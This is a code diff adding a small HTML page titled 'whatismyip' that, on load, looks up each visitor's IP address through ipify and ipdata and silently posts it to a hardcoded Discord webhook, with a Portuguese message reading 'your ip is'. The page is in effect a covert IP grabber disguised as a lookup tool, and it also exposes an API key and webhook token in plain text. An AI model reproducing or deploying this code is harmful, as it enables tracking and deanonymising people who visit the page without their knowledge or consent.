@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+
+<script type="text/javascript">
+
+
+function getIP(json) {
+    function json(url) {
+    return fetch(url).then(res => res.json());
+    }
+    
+    let apiKey = '16986c20c9c8e22e62d5d0e5d888552507b4b4469432ca24d1970188';
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/897975377551556678/CaoTJHsJBggXEfcm93JqFIAt9eagAhmrr8E4ZgvOvGLC2eS4vSpeauOjoqWL0DRjJTyQ");
+     
+     request.setRequestHeader('Content-type', 'application/json');
+     
+     var params = 
+     {
+          username: "whatismyip",
+          avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d9/Icon-round-Question_mark.svg/1200px-Icon-round-Question_mark.svg.png",
+          content: "Seu ip é:  " + data.ip + "**         **"
+     }
+     
+     request.send(JSON.stringify(params));
+    });
+}
+
+</script>
+</head>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<body onload="getIP()"> 
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>whatismyip</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+  </head>
+  <body>
+    <script src="script.js"></script>
+  </body>
+</html>
